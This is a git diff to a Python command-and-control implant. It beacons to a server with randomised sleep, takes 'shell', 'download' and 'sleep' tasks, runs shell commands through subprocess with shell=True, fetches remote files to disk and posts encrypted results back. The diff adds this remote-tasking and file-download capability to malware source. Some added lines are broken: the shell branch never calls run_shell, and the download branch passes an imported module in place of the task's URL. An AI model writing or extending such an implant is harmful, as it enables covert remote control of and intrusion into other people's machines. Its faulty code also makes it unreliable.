@@ -5,7 +5,9 @@ import uuid
 import random
 import requests
 import subprocess
-import  Encryption
+
+from urllib3.util import url
+
 from Encryption import encrypt_data
 
 #Configuration
@@ -47,12 +49,43 @@ def beacon():
 
 
 def execute_task(task):
+    task_type = task.get('type')
+
+    if task_type == 'shell':
+        command = task.get('command')
+        run = task.get(command)
+    elif task_type == 'download':
+        command = task.get('url')
+        save_as = task.get('save_as')
+        download_file(url, save_as)
+    elif task_type == 'sleep':
+        global SLEEP_MIN, SLEEP_MAX
+        SLEEP_MIN = task.get("min", SLEEP_MIN)
+        SLEEP_MAX = task.get("max", SLEEP_MAX)
+    else:
+        print(f"[!] Unknown task type : {task_type}")
+
+
+
+def run_shell(command):
     try:
-        print(f"[+] Executing task: {task}")
-        result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
-        post_result(result.decode())
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        post_result(result.decode()) # byte -> string
     except subprocess.CalledProcessError as e:
         post_result(e.output.decode())
+
+def download_file(url, save_as):
+    try:
+        response = requests.get(url, stream=True)
+        with open(save_as, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        post_result(f"[+] Downloaded {url} as {save_as}")
+    except Exception as e:
+        post_result(f"[!] Download error : {e}")
+
+
+
 
 def post_result(result):
     headers = {
@@ -73,6 +106,9 @@ def main():
         beacon()
         sleep_time = random.uniform(SLEEP_MIN, SLEEP_MAX)
         time.sleep(sleep_time)
+
+
+
 
 if __name__ == '__main__':
     main()
